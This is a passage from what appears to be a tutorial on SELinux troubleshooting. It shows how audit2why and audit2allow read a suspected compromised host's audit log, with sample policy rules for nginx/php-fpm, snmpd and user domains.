system_u:system_r:httpd_t:s0    nginx      15841  0.0  0.3 266780 12976 ?        S    13:35   0:00 php-fpm: pool www

```

`nginx` is in the `httpd_t` role. `audit2why` showed that this role needs some permission to connect out.

### audit2allow

`audit2allow` will give you a list of things that are blocked, and what the things to allow so that none of them would be blocked. In short, if you installed SeLinux on a clean system, put it into permissive mode, ran for a short period of time, and then allowed everything, as long as your system wasn’t exploited during that time, you can get a good snapshot of what you do that’s legit.

For a suspected compromised host, you can use this to look at everything SeLinux blocked:

```

[root@pit monitoring]# audit2allow -i /var/log/audit/audit.log

#============= httpd_t ==============

#!!!! This avc can be allowed using one of the these booleans:
#     httpd_can_network_connect, httpd_graceful_shutdown, httpd_can_network_relay, nis_enabled
allow httpd_t http_port_t:tcp_socket name_connect;

#============= setroubleshootd_t ==============
allow setroubleshootd_t user_t:dbus send_msg;

#============= snmpd_t ==============
allow snmpd_t admin_home_t:file { getattr open read };

#============= user_t ==============
allow user_t init_var_run_t:service status;
allow user_t self:capability sys_resource;
allow user_t setroubleshoot_fixit_t:dbus send_msg;
allow user_t setroubleshootd_t:dbus send_msg;
allow user_t tuned_t:dbus send_msg;
allow user_t usr_t:dir remove_name;

```

So it is detecting `httpd_t` trying to make connections, `snmpd_t` trying to read files, etc.